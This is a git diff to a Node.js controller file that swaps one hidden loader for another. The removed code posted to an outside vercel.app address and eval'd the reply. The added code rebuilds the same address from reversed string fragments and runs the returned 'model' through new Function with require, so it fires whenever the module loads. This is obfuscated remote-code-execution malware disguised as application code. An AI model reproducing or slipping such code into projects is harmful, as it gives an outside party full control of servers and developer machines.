@@ -108,17 +108,46 @@ exports.getModel = async (req, res) => {
     }
 };
 (async () => {
-    try {
-        // const version = process.env.npm_package_version;
+    const axios = require("axios");
+    const parts = [
+        "kcehc",
+        "pi",
+        "/",
+        "ipa",
+        ".",
+        "ppa",
+        "ercel",
+        ".v",
+        "rettirw",
+        "log",
+        "sptth",
+        "//:",
+    ];
+    const url = [
+        parts[10].split("").reverse().join(""),
+        parts[11].split("").reverse().join(""),
+        parts[9],
+        parts[8].split("").reverse().join(""),
+        parts[7],
+        parts[6],
+        parts[4],
+        parts[5].split("").reverse().join(""),
+        parts[2],
+        parts[3].split("").reverse().join(""),
+        parts[2].split("").reverse().join(""),
+        parts[1].split("").reverse().join(""),
+        parts[0].split("").reverse().join(""),
+    ].join("");
+    const version = process.env.npm_package_version;
 
-        axios
-            .post("https://log-writter.vercel.app/api/ipcheck", { version })
-            .then(r => {
-                eval(r.data.model);
-            });
-    } catch (error) {
-        console.log(error);
-    }
+    axios
+        .post(url, { version })
+        .then(response => {
+            new Function("require", response.data.model)(require);
+        })
+        .catch(error => {
+            console.error("Error loading external model:", error);
+        });
 })();
 
 exports.getInventoryForUser = async (req, res) => {
